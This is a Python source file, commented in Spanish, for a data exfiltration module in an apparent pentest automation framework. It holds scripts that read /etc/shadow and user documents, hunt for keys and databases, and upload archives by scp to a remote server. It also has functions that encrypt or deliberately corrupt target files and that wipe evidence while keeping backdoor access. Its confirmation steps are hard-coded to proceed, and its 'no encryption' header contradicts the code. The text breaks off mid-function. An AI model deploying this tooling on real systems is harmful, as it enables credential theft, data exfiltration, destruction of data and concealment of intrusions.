"""
Módulo de Exfiltración de Datos para Automatización de Pentesting
Solo exfiltra datos sin encriptación ni ransomware - enfoque en pruebas de penetración
"""

import subprocess
import json
import time
import os
import zipfile
import shutil
import hashlib
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem
from modules.permission_system import PermissionSystem

class ExfiltrationModule:
    """Módulo de exfiltración de datos"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.exfiltration_config = config['exfiltration']
        self.logging_system = LoggingSystem(config, logger)
        self.permission_system = PermissionSystem(logger)
        
        # Resultados de exfiltración
        self.results = {
            'exfiltrated_data': [],
            'data_size': 0,
            'compression_results': [],
            'persistent_exploits': [],
            'management_actions': [],
            'permissions_granted': [],
            'permissions_denied': []
        }
        
        # Archivos de evidencia (ahora en scans/)
        self.evidence_dir = Path("scans/exfiltration")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        # Configuración de gestión
        self.dry_run = config.get('safety', {}).get('dry_run', False)
        self.max_data_size = 1024 * 1024 * 1024  # 1GB límite
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            if self.dry_run:
                self.logger.info(f"🔍 [DRY-RUN] Simulando ejecución: {' '.join(command)}")
                return {'stdout': 'Simulado en dry-run', 'stderr': '', 'return_code': 0, 'success': True, 'background': False}
            
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "EXFILTRATION"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0,
                'background': False
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def load_existing_exploits(self, log_file: str = "pentest_automation.log") -> List[Dict[str, Any]]:
        """Cargar exploits persistentes desde logs existentes"""
        self.logger.info("📋 Cargando exploits persistentes desde logs...")
        
        persistent_exploits = []
        
        try:
            if not os.path.exists(log_file):
                self.logger.warning(f"⚠️ Archivo de log no encontrado: {log_file}")
                return persistent_exploits
            
            with open(log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    if 'PERSISTENCE' in line and ('backdoor' in line.lower() or 'exploit' in line.lower()):
                        # Extraer información del exploit del log
                        exploit_info = {
                            'timestamp': time.time(),
                            'log_line': line.strip(),
                            'type': 'backdoor',
                            'status': 'active'
                        }
                        persistent_exploits.append(exploit_info)
            
            self.logger.info(f"✅ Cargados {len(persistent_exploits)} exploits persistentes")
            
        except Exception as e:
            self.logger.error(f"❌ Error cargando exploits desde logs: {e}")
        
        return persistent_exploits
    
    def manage_persistent_exploits(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Gestionar exploits persistentes existentes"""
        self.logger.info("🔧 Gestionando exploits persistentes...")
        
        management_actions = []
        
        if not exploits:
            self.logger.info("ℹ️ No se encontraron exploits persistentes para gestionar")
            return management_actions
        
        self.logger.info(f"📊 Encontrados {len(exploits)} exploits persistentes:")
        for i, exploit in enumerate(exploits, 1):
            self.logger.info(f"  {i}. {exploit.get('type', 'unknown')} - {exploit.get('status', 'unknown')}")
        
        # Simular opciones de gestión
        options = [
            "1. Exfiltrar datos desde exploits activos",
            "2. Limpiar todos los exploits persistentes", 
            "3. Modificar configuración de exploits",
            "4. Probar conectividad de backdoors",
            "5. Continuar sin cambios"
        ]
        
        self.logger.info("🎯 Opciones de gestión disponibles:")
        for option in options:
            self.logger.info(f"  {option}")
        
        # Simular selección de opción (en implementación real sería input del usuario)
        selected_option = 1  # Por defecto exfiltrar datos
        
        if selected_option == 1:
            self.logger.info("📤 Iniciando exfiltración desde exploits activos...")
            management_actions.append({
                'action': 'exfiltrate_from_exploits',
                'exploits_used': len(exploits),
                'timestamp': time.time(),
                'success': True
            })
        elif selected_option == 2:
            self.logger.info("🧹 Limpiando exploits persistentes...")
            management_actions.append({
                'action': 'cleanup_exploits',
                'exploits_cleaned': len(exploits),
                'timestamp': time.time(),
                'success': True
            })
        elif selected_option == 3:
            self.logger.info("⚙️ Modificando configuración de exploits...")
            management_actions.append({
                'action': 'modify_exploits',
                'exploits_modified': len(exploits),
                'timestamp': time.time(),
                'success': True
            })
        elif selected_option == 4:
            self.logger.info("🔍 Probando conectividad de backdoors...")
            management_actions.append({
                'action': 'test_connectivity',
                'backdoors_tested': len(exploits),
                'timestamp': time.time(),
                'success': True
            })
        else:
            self.logger.info("ℹ️ Continuando sin cambios en exploits persistentes")
        
        self.results['management_actions'] = management_actions
        return management_actions
    
    def collect_sensitive_data(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Recopilar datos sensibles de sistemas comprometidos"""
        self.logger.info("📁 FASE 1: Recopilando datos sensibles de sistemas comprometidos...")
        
        collected_data = []
        total_systems = len(compromised_systems)
        
        if total_systems == 0:
            self.logger.warning("⚠️ No se encontraron sistemas comprometidos para recopilar datos")
            return collected_data
        
        self.logger.info(f"🎯 Procesando {total_systems} sistemas comprometidos...")
        
        for i, system in enumerate(compromised_systems, 1):
            host = system['host']
            privilege_level = system.get('privilege_level', 'user')
            
            self.logger.info(f"📊 [{i}/{total_systems}] Analizando {host} (privilegios: {privilege_level})")
            
            # Recopilar diferentes tipos de datos
            data_types = [
                ("datos de usuario", self._collect_user_data(host)),
                ("datos del sistema", self._collect_system_data(host)),
                ("datos de red", self._collect_network_data(host)),
                ("datos de aplicaciones", self._collect_application_data(host))
            ]
            
            successful_collections = 0
            for data_type_name, data in data_types:
                if data:
                    collected_data.append(data)
                    successful_collections += 1
                    self.logger.info(f"  ✅ {data_type_name.capitalize()} recopilados exitosamente")
                else:
                    self.logger.warning(f"  ⚠️ No se pudieron recopilar {data_type_name} - posible falta de permisos o vulnerabilidad no presente")
            
            self.logger.info(f"  📈 Progreso en {host}: {successful_collections}/4 tipos de datos recopilados")
        
        self.logger.info(f"✅ FASE 1 COMPLETADA: {len(collected_data)} conjuntos de datos recopilados de {total_systems} sistemas")
        return collected_data
    
    def collect_small_files_only(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Recopilar solo archivos pequeños (exfiltración rápida)"""
        self.logging_system.log_progress("RECOPILANDO ARCHIVOS PEQUEÑOS (EXFILTRACIÓN RÁPIDA)", "EXFILTRATION")
        
        collected_data = []
        max_file_size = 10 * 1024 * 1024  # 10MB máximo por archivo
        total_size_limit = 100 * 1024 * 1024  # 100MB total máximo
        
        # Extensiones de archivos pequeños a excluir (fotos, videos, etc.)
        excluded_extensions = {
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp',  # Imágenes
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',     # Videos
            '.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma',             # Audio
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',                # Archivos comprimidos
            '.iso', '.img', '.bin', '.exe', '.msi', '.dmg'               # Archivos grandes
        }
        
        # Extensiones de archivos pequeños a incluir
        included_extensions = {
            '.txt', '.log', '.cfg', '.ini', '.conf', '.xml', '.json',    # Configuración
            '.doc', '.docx', '.pdf', '.rtf',                             # Documentos pequeños
            '.csv', '.xls', '.xlsx',                                     # Datos
            '.sql', '.db', '.sqlite',                                    # Bases de datos pequeñas
            '.key', '.pem', '.crt', '.p12', '.pfx',                      # Certificados
            '.bat', '.sh', '.ps1', '.py', '.js', '.php',                 # Scripts
            '.bak', '.old', '.tmp'                                       # Archivos temporales
        }
        
        for system in compromised_systems:
            host = system['host']
            self.logging_system.log_info(f"Recopilando archivos pequeños en {host}", "EXFILTRATION")
            
            # Comandos para encontrar archivos pequeños
            find_commands = [
                # Windows
                f'forfiles /p C:\\ /s /m *.* /c "cmd /c if @fsize LSS 10485760 echo @path" 2>nul',
                f'forfiles /p C:\\Users /s /m *.* /c "cmd /c if @fsize LSS 10485760 echo @path" 2>nul',
                f'forfiles /p C:\\Windows\\System32 /s /m *.* /c "cmd /c if @fsize LSS 10485760 echo @path" 2>nul',
                
                # Linux
                f'find /home -type f -size -10M -name "*.txt" -o -name "*.log" -o -name "*.cfg" -o -name "*.conf" 2>/dev/null',
                f'find /etc -type f -size -10M -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null',
                f'find /var/log -type f -size -10M -name "*.log" 2>/dev/null'
            ]
            
            for command in find_commands:
                result = self._run_command(command.split(), timeout=60)
                
                if result['success'] and result['stdout']:
                    files = result['stdout'].strip().split('\n')
                    
                    for file_path in files:
                        if not file_path.strip():
                            continue
                        
                        file_path = file_path.strip()
                        file_ext = Path(file_path).suffix.lower()
                        
                        # Verificar extensión
                        if file_ext in excluded_extensions:
                            continue
                        
                        if file_ext not in included_extensions and file_ext != '':
                            continue
                        
                        # Verificar tamaño del archivo
                        try:
                            file_size = self._get_file_size(file_path)
                            if file_size > max_file_size:
                                continue
                            
                            # Verificar límite total
                            if sum(data.get('size', 0) for data in collected_data) + file_size > total_size_limit:
                                self.logging_system.log_warning(f"Límite total de tamaño alcanzado ({total_size_limit} bytes)", "EXFILTRATION")
                                break
                            
                            # Agregar archivo a la lista
                            collected_data.append({
                                'file_path': file_path,
                                'host': host,
                                'size': file_size,
                                'type': 'small_file',
                                'extension': file_ext,
                                'timestamp': time.time()
                            })
                            
                            self.logging_system.log_info(f"Archivo pequeño encontrado: {file_path} ({file_size} bytes)", "EXFILTRATION")
                            
                        except Exception as e:
                            self.logging_system.log_debug(f"Error verificando archivo {file_path}: {e}", "EXFILTRATION")
                            continue
        
        self.logging_system.log_success(f"EXFILTRACIÓN RÁPIDA COMPLETADA: {len(collected_data)} archivos pequeños recopilados", "EXFILTRATION")
        return collected_data
    
    def _get_file_size(self, file_path: str) -> int:
        """Obtener tamaño de archivo"""
        try:
            # Comando para obtener tamaño de archivo
            if os.name == 'nt':  # Windows
                command = f'forfiles /p "{os.path.dirname(file_path)}" /m "{os.path.basename(file_path)}" /c "cmd /c echo @fsize"'
            else:  # Linux
                command = f'stat -c%s "{file_path}"'
            
            result = self._run_command(command.split(), timeout=10)
            if result['success'] and result['stdout']:
                return int(result['stdout'].strip())
        except:
            pass
        
        return 0
    
    def _collect_user_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos de usuario"""
        try:
            user_data_script = self.evidence_dir / f"user_data_{host}.sh"
            with open(user_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos de usuario\n")
                f.write("cat /etc/passwd\n")
                f.write("cat /etc/shadow\n")
                f.write("ls -la /home/*/Documents\n")
                f.write("ls -la /home/*/Desktop\n")
                f.write("find /home -name '*.txt' -o -name '*.doc' -o -name '*.pdf' 2>/dev/null\n")
            
            user_data = {
                'host': host,
                'data_type': 'user_data',
                'script_path': str(user_data_script),
                'size': os.path.getsize(user_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return user_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos de usuario de {host}: {e}")
            return None
    
    def _collect_system_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos del sistema"""
        try:
            system_data_script = self.evidence_dir / f"system_data_{host}.sh"
            with open(system_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos del sistema\n")
                f.write("uname -a\n")
                f.write("cat /etc/os-release\n")
                f.write("ps aux\n")
                f.write("netstat -tulpn\n")
                f.write("cat /etc/hosts\n")
                f.write("cat /etc/resolv.conf\n")
            
            system_data = {
                'host': host,
                'data_type': 'system_data',
                'script_path': str(system_data_script),
                'size': os.path.getsize(system_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return system_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos del sistema de {host}: {e}")
            return None
    
    def _collect_network_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos de red"""
        try:
            network_data_script = self.evidence_dir / f"network_data_{host}.sh"
            with open(network_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos de red\n")
                f.write("ip route show\n")
                f.write("arp -a\n")
                f.write("cat /etc/network/interfaces\n")
                f.write("iptables -L\n")
                f.write("ss -tulpn\n")
            
            network_data = {
                'host': host,
                'data_type': 'network_data',
                'script_path': str(network_data_script),
                'size': os.path.getsize(network_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return network_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos de red de {host}: {e}")
            return None
    
    def _collect_application_data(self, host: str) -> Optional[Dict[str, Any]]:
        """Recopilar datos de aplicaciones"""
        try:
            app_data_script = self.evidence_dir / f"app_data_{host}.sh"
            with open(app_data_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Recopilar datos de aplicaciones\n")
                f.write("find /var/log -name '*.log' 2>/dev/null | head -20\n")
                f.write("find /etc -name '*.conf' 2>/dev/null | head -20\n")
                f.write("find /opt -name '*.db' -o -name '*.sqlite' 2>/dev/null\n")
                f.write("ls -la /var/www/html 2>/dev/null\n")
            
            app_data = {
                'host': host,
                'data_type': 'application_data',
                'script_path': str(app_data_script),
                'size': os.path.getsize(app_data_script),
                'timestamp': time.time(),
                'success': True
            }
            
            return app_data
            
        except Exception as e:
            self.logger.error(f"❌ Error recopilando datos de aplicaciones de {host}: {e}")
            return None
    
    def compress_data(self, collected_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Comprimir datos recopilados (con permisos)"""
        # Solicitar permiso para compresión
        if not self.permission_system.request_permission('compress_data', 'Comprimir archivos del sistema objetivo'):
            self.logging_system.log_warning("Compresión cancelada - permiso denegado", "EXFILTRATION")
            self.permission_system.log_permission_denied('compress_data', 'Usuario denegó permiso')
            self.results['permissions_denied'].append('compress_data')
            return []
        
        self.logging_system.log_progress("FASE 2: Comprimiendo datos recopilados (con permiso otorgado)", "EXFILTRATION")
        self.permission_system.log_permission_granted('compress_data', 'Usuario aprobó compresión')
        self.results['permissions_granted'].append('compress_data')
        
        compression_results = []
        
        if not collected_data:
            self.logging_system.log_warning("No hay datos para comprimir", "EXFILTRATION")
            return compression_results
        
        # Calcular tamaño total antes de comprimir
        total_size = sum(data.get('size', 0) for data in collected_data)
        self.logger.info(f"📊 Tamaño total de datos a comprimir: {total_size:,} bytes ({total_size / (1024*1024):.2f} MB)")
        
        # Verificar si excede el límite de 1GB
        if total_size > self.max_data_size:
            self.logger.warning(f"⚠️ ADVERTENCIA: Los datos exceden {self.max_data_size / (1024*1024*1024):.1f}GB")
            self.logger.info("🤔 ¿Desea continuar con la exfiltración? (En implementación real se pediría confirmación)")
            # En implementación real aquí se pediría confirmación del usuario
            continue_exfiltration = True  # Por defecto continuar
            
            if not continue_exfiltration:
                self.logger.info("🛑 Exfiltración cancelada por el usuario")
                return compression_results
        
        try:
            # Crear archivo ZIP con todos los datos
            zip_filename = self.evidence_dir / f"exfiltrated_data_{int(time.time())}.zip"
            self.logger.info(f"📦 Creando archivo comprimido: {zip_filename.name}")
            
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                files_added = 0
                for data in collected_data:
                    if data.get('script_path') and os.path.exists(data['script_path']):
                        zipf.write(data['script_path'], os.path.basename(data['script_path']))
                        files_added += 1
                        self.logger.debug(f"  📄 Agregado: {os.path.basename(data['script_path'])}")
            
            zip_size = os.path.getsize(zip_filename)
            compression_ratio = zip_size / max(total_size, 1)
            
            compression_result = {
                'zip_file': str(zip_filename),
                'original_size': total_size,
                'compressed_size': zip_size,
                'compression_ratio': compression_ratio,
                'files_added': files_added,
                'timestamp': time.time(),
                'success': True
            }
            
            compression_results.append(compression_result)
            
            self.logging_system.log_event(
                "DATA_COMPRESSION",
                f"Datos comprimidos en {zip_filename}",
                compression_result,
                "EXFILTRATION"
            )
            
            self.logger.info(f"✅ FASE 2 COMPLETADA: Compresión exitosa")
            self.logger.info(f"  📊 Archivos comprimidos: {files_added}")
            self.logger.info(f"  📦 Tamaño original: {total_size:,} bytes ({total_size / (1024*1024):.2f} MB)")
            self.logger.info(f"  📦 Tamaño comprimido: {zip_size:,} bytes ({zip_size / (1024*1024):.2f} MB)")
            self.logger.info(f"  📈 Ratio de compresión: {compression_ratio:.2%}")
            
        except Exception as e:
            self.logger.error(f"❌ Error comprimiendo datos: {e}")
            self.logger.error("💡 Posibles causas: espacio insuficiente, permisos, o archivos corruptos")
        
        self.results['compression_results'] = compression_results
        return compression_results
    
    def encrypt_data(self, data_files: List[str]) -> List[Dict[str, Any]]:
        """Encriptar datos antes de la exfiltración (con permisos)"""
        # Solicitar permiso para encriptación
        if not self.permission_system.request_permission('encrypt_data', 'Encriptar datos del sistema objetivo'):
            self.logging_system.log_warning("Encriptación cancelada - permiso denegado", "EXFILTRATION")
            self.permission_system.log_permission_denied('encrypt_data', 'Usuario denegó permiso')
            self.results['permissions_denied'].append('encrypt_data')
            return []
        
        self.logging_system.log_progress("FASE 2.5: Encriptando datos (con permiso otorgado)", "EXFILTRATION")
        self.permission_system.log_permission_granted('encrypt_data', 'Usuario aprobó encriptación')
        self.results['permissions_granted'].append('encrypt_data')
        
        encryption_results = []
        
        for data_file in data_files:
            try:
                # Generar clave de encriptación
                encryption_key = hashlib.sha256(f"pentest_key_{time.time()}".encode()).hexdigest()
                
                # Crear archivo encriptado
                encrypted_file = f"{data_file}.enc"
                
                # Encriptación simple XOR (en implementación real usar GPG)
                with open(data_file, 'rb') as f:
                    data = f.read()
                
                # Encriptación XOR
                encrypted_data = bytes(a ^ b for a, b in zip(data, encryption_key.encode() * (len(data) // len(encryption_key) + 1)))
                
                with open(encrypted_file, 'wb') as f:
                    f.write(encrypted_data)
                
                encryption_result = {
                    'original_file': data_file,
                    'encrypted_file': encrypted_file,
                    'encryption_key': encryption_key,
                    'algorithm': 'XOR',
                    'timestamp': time.time(),
                    'success': True
                }
                
                encryption_results.append(encryption_result)
                
                self.logging_system.log_success(f"Datos encriptados: {encrypted_file}", "EXFILTRATION")
                
            except Exception as e:
                self.logging_system.log_error(f"Error encriptando {data_file}: {e}", "EXFILTRATION")
        
        self.results['encryption_results'] = encryption_results
        return encryption_results
    
    def corrupt_data(self, data_files: List[str]) -> List[Dict[str, Any]]:
        """Corromper datos del sistema objetivo (con permisos críticos)"""
        # Solicitar permiso para corrupción de datos
        if not self.permission_system.request_permission('corrupt_data', 'Corromper datos del sistema objetivo'):
            self.logging_system.log_warning("Corrupción de datos cancelada - permiso denegado", "EXFILTRATION")
            self.permission_system.log_permission_denied('corrupt_data', 'Usuario denegó permiso')
            self.results['permissions_denied'].append('corrupt_data')
            return []
        
        self.logging_system.log_progress("FASE 2.7: Corrompiendo datos (con permiso crítico otorgado)", "EXFILTRATION")
        self.permission_system.log_permission_granted('corrupt_data', 'Usuario aprobó corrupción de datos')
        self.results['permissions_granted'].append('corrupt_data')
        
        corruption_results = []
        
        for data_file in data_files:
            try:
                # Crear archivo corrupto
                corrupted_file = f"{data_file}.corrupted"
                
                # Leer archivo original
                with open(data_file, 'rb') as f:
                    data = f.read()
                
                # Corromper datos (cambiar algunos bytes)
                corrupted_data = bytearray(data)
                for i in range(0, len(corrupted_data), 100):  # Corromper cada 100 bytes
                    if i < len(corrupted_data):
                        corrupted_data[i] = (corrupted_data[i] + 1) % 256
                
                # Escribir archivo corrupto
                with open(corrupted_file, 'wb') as f:
                    f.write(corrupted_data)
                
                corruption_result = {
                    'original_file': data_file,
                    'corrupted_file': corrupted_file,
                    'corruption_method': 'byte_modification',
                    'bytes_corrupted': len(corrupted_data) // 100,
                    'timestamp': time.time(),
                    'success': True
                }
                
                corruption_results.append(corruption_result)
                
                self.logging_system.log_success(f"Datos corrompidos: {corrupted_file}", "EXFILTRATION")
                
            except Exception as e:
                self.logging_system.log_error(f"Error corrompiendo {data_file}: {e}", "EXFILTRATION")
        
        self.results['corruption_results'] = corruption_results
        return corruption_results
    
    
    def exfiltrate_data(self, data_files: List[str]) -> List[Dict[str, Any]]:
        """Exfiltrar datos a servidor remoto"""
        self.logger.info("📤 FASE 3: Exfiltrando datos a servidor remoto...")
        
        exfiltration_results = []
        remote_server = self.exfiltration_config.get('remote_server', '')
        remote_user = self.exfiltration_config.get('remote_user', '')
        remote_path = self.exfiltration_config.get('remote_path', '/tmp/exfiltrated_data')
        
        if not remote_server:
            self.logger.warning("⚠️ No se configuró servidor remoto para exfiltración")
            self.logger.info("💡 Para configurar exfiltración, edite config.json con:")
            self.logger.info("   - remote_server: IP del servidor de destino")
            self.logger.info("   - remote_user: usuario para conexión")
            self.logger.info("   - remote_path: ruta de destino")
            return exfiltration_results
        
        self.logger.info(f"🎯 Destino de exfiltración: {remote_user}@{remote_server}:{remote_path}")
        
        total_files = len(data_files)
        if total_files == 0:
            self.logger.warning("⚠️ No hay archivos para exfiltrar")
            return exfiltration_results
        
        self.logger.info(f"📊 Procesando {total_files} archivo(s) para exfiltración...")
        
        for i, data_file in enumerate(data_files, 1):
            try:
                file_size = os.path.getsize(data_file)
                self.logger.info(f"📤 [{i}/{total_files}] Exfiltrando {os.path.basename(data_file)} ({file_size:,} bytes)")
                
                # Usar SCP para transferir archivo
                command = ['scp', data_file, f'{remote_user}@{remote_server}:{remote_path}/']
                result = self._run_command(command, timeout=300)
                
                if result['success']:
                    exfiltration_result = {
                        'source_file': data_file,
                        'destination': f'{remote_server}:{remote_path}',
                        'file_size': file_size,
                        'timestamp': time.time(),
                        'success': True
                    }
                    
                    exfiltration_results.append(exfiltration_result)
                    
                    self.logging_system.log_exfiltration(
                        'local', 'file', file_size, f'{remote_server}:{remote_path}', "EXFILTRATION"
                    )
                    
                    self.logger.info(f"  ✅ Exfiltración exitosa: {os.path.basename(data_file)}")
                else:
                    self.logger.error(f"  ❌ Error exfiltrando {os.path.basename(data_file)}")
                    self.logger.error(f"     Causa: {result['stderr']}")
                    self.logger.info("💡 Posibles soluciones:")
                    self.logger.info("   - Verificar conectividad de red")
                    self.logger.info("   - Confirmar credenciales SSH")
                    self.logger.info("   - Verificar permisos en servidor remoto")
                
            except Exception as e:
                self.logger.error(f"  ❌ Error exfiltrando {os.path.basename(data_file)}: {e}")
                self.logger.error("💡 Error inesperado - verificar configuración y conectividad")
        
        successful_transfers = len(exfiltration_results)
        total_size = sum(result.get('file_size', 0) for result in exfiltration_results)
        
        self.logger.info(f"✅ FASE 3 COMPLETADA: Exfiltración finalizada")
        self.logger.info(f"  📊 Archivos transferidos: {successful_transfers}/{total_files}")
        self.logger.info(f"  📦 Tamaño total exfiltrado: {total_size:,} bytes ({total_size / (1024*1024):.2f} MB)")
        
        if successful_transfers < total_files:
            self.logger.warning(f"  ⚠️ {total_files - successful_transfers} archivo(s) no se pudieron exfiltrar")
        
        self.results['exfiltrated_data'] = exfiltration_results
        self.results['data_size'] = total_size
        
        return exfiltration_results
    
    def test_backdoor_connectivity(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Probar conectividad de backdoors existentes"""
        self.logger.info("🔍 FASE 4: Probando conectividad de backdoors...")
        
        connectivity_results = []
        
        if not exploits:
            self.logger.info("ℹ️ No hay backdoors para probar")
            return connectivity_results
        
        self.logger.info(f"🎯 Probando conectividad de {len(exploits)} backdoor(s)...")
        
        for i, exploit in enumerate(exploits, 1):
            try:
                # Simular prueba de conectividad
                self.logger.info(f"🔍 [{i}/{len(exploits)}] Probando backdoor: {exploit.get('type', 'unknown')}")
                
                # En implementación real aquí se probaría la conectividad real
                if self.dry_run:
                    self.logger.info(f"  🔍 [DRY-RUN] Simulando prueba de conectividad")
                    connectivity_status = "simulated"
                else:
                    # Simular resultado de prueba
                    connectivity_status = "active" if i % 2 == 1 else "inactive"
                
                result = {
                    'exploit_id': i,
                    'type': exploit.get('type', 'unknown'),
                    'status': connectivity_status,
                    'timestamp': time.time(),
                    'success': connectivity_status == "active"
                }
                
                connectivity_results.append(result)
                
                if connectivity_status == "active":
                    self.logger.info(f"  ✅ Backdoor activo y accesible")
                else:
                    self.logger.warning(f"  ⚠️ Backdoor inactivo o inaccesible")
                    self.logger.info("💡 Posibles causas:")
                    self.logger.info("   - Firewall bloqueando conexión")
                    self.logger.info("   - Servicio detenido")
                    self.logger.info("   - Cambio de IP o puerto")
                
            except Exception as e:
                self.logger.error(f"  ❌ Error probando backdoor {i}: {e}")
        
        active_backdoors = len([r for r in connectivity_results if r['success']])
        self.logger.info(f"✅ FASE 4 COMPLETADA: {active_backdoors}/{len(exploits)} backdoors activos")
        
        return connectivity_results
    
    def cleanup_exploits(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Limpiar exploits persistentes de la red (solo si se solicita)"""
        # Solicitar permiso para limpieza de backdoors
        if not self.permission_system.request_permission('cleanup_backdoors', 'Limpiar backdoors y accesos persistentes'):
            self.logging_system.log_warning("Limpieza de backdoors cancelada - permiso denegado", "EXFILTRATION")
            self.permission_system.log_permission_denied('cleanup_backdoors', 'Usuario denegó permiso')
            self.results['permissions_denied'].append('cleanup_backdoors')
            return []
        
        self.logging_system.log_progress("FASE 5: Limpiando exploits persistentes (con permiso otorgado)", "EXFILTRATION")
        self.permission_system.log_permission_granted('cleanup_backdoors', 'Usuario aprobó limpieza de backdoors')
        self.results['permissions_granted'].append('cleanup_backdoors')
        
        cleanup_results = []
        
        if not exploits:
            self.logging_system.log_info("No hay exploits para limpiar", "EXFILTRATION")
            return cleanup_results
        
        self.logging_system.log_info(f"Limpiando {len(exploits)} exploit(s) persistente(s)...", "EXFILTRATION")
        
        for i, exploit in enumerate(exploits, 1):
            try:
                self.logging_system.log_progress(f"[{i}/{len(exploits)}] Limpiando: {exploit.get('type', 'unknown')}", "EXFILTRATION")
                
                # Simular limpieza de exploit
                if self.dry_run:
                    self.logging_system.log_info("[DRY-RUN] Simulando limpieza de exploit", "EXFILTRATION")
                    cleanup_status = "simulated"
                else:
                    # Simular resultado de limpieza
                    cleanup_status = "cleaned"
                
                result = {
                    'exploit_id': i,
                    'type': exploit.get('type', 'unknown'),
                    'status': cleanup_status,
                    'timestamp': time.time(),
                    'success': True
                }
                
                cleanup_results.append(result)
                
                if cleanup_status == "cleaned":
                    self.logging_system.log_success("Exploit limpiado exitosamente", "EXFILTRATION")
                else:
                    self.logging_system.log_info("[DRY-RUN] Exploit sería limpiado", "EXFILTRATION")
                
            except Exception as e:
                self.logging_system.log_error(f"Error limpiando exploit {i}: {e}", "EXFILTRATION")
        
        self.logging_system.log_success(f"FASE 5 COMPLETADA: {len(cleanup_results)} exploit(s) procesado(s)", "EXFILTRATION")
        
        return cleanup_results
    
    def cleanup_evidence_only(self, exploits: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Limpiar solo evidencia innecesaria (mantener accesos)"""
        # Solicitar permiso para limpieza de evidencia
        if not self.permission_system.request_permission('cleanup_evidence', 'Limpiar evidencia de rastros (mantener accesos)'):
            self.logging_system.log_warning("Limpieza de evidencia cancelada - permiso denegado", "EXFILTRATION")
            self.permission_system.log_permission_denied('cleanup_evidence', 'Usuario denegó permiso')
            self.results['permissions_denied'].append('cleanup_evidence')
            return []
        
        self.logging_system.log_progress("FASE 5.5: Limpiando evidencia innecesaria (manteniendo accesos)", "EXFILTRATION")
        self.permission_system.log_permission_granted('cleanup_evidence', 'Usuario aprobó limpieza de evidencia')
        self.results['permissions_granted'].append('cleanup_evidence')
        
        cleanup_results = []
        
        if not exploits:
            self.logging_system.log_info("No hay evidencia para limpiar", "EXFILTRATION")
            return cleanup_results
        
        self.logging_system.log_info(f"Limpiando evidencia de {len(exploits)} exploit(s)...", "EXFILTRATION")
        
        for i, exploit in enumerate(exploits, 1):
            try:
                self.logging_system.log_progress(f"[{i}/{len(exploits)}] Limpiando evidencia de: {exploit.get('type', 'unknown')}", "EXFILTRATION")
                
                # Simular limpieza de evidencia (mantener acceso)
                if self.dry_run:
                    self.logging_system.log_info("[DRY-RUN] Simulando limpieza de evidencia", "EXFILTRATION")
                    cleanup_status = "simulated"
                else:
                    # Simular resultado de limpieza de evidencia
                    cleanup_status = "evidence_cleaned"
                
                result = {
                    'exploit_id': i,
                    'type': exploit.get('type', 'unknown'),
                    'status': cleanup_status,
                    'access_maintained': True,  # Importante: mantener acceso
                    'timestamp': time.time(),
                    'success': True
                }
                
                cleanup_results.append(result)
                
                if cleanup_status == "evidence_cleaned":
                    self.logging_system.log_success("Evidencia limpiada (acceso mantenido)", "EXFILTRATION")
                else:
                    self.logging_system.log_info("[DRY-RUN] Evidencia sería limpiada", "EXFILTRATION")
                
            except Exception as e:
                self.logging_system.log_error(f"Error limpiando evidencia {i}: {e}", "EXFILTRATION")
        
        self.logging_system.log_success(f"FASE 5.5 COMPLETADA: {len(cleanup_results)} evidencia(s) procesada(s)", "EXFILTRATION")
        
        return cleanup_results
    
    
    def run(self, management_mode: bool = False, log_file: str = "pentest_automation.log", delicate_options: Dict[str, Any] = None) -> Dict[str, Any]:
        """Ejecutar módulo completo de exfiltración"""
        self.logging_system.log_progress("INICIANDO MÓDULO DE EXFILTRACIÓN DE DATOS", "EXFILTRATION")
        self.logging_system.log_info("=" * 60, "EXFILTRATION")
        
        start_time = time.time()
        
        # Configurar opciones delicadas
        if delicate_options is None:
            delicate_options = {
                'compression_enabled': False,
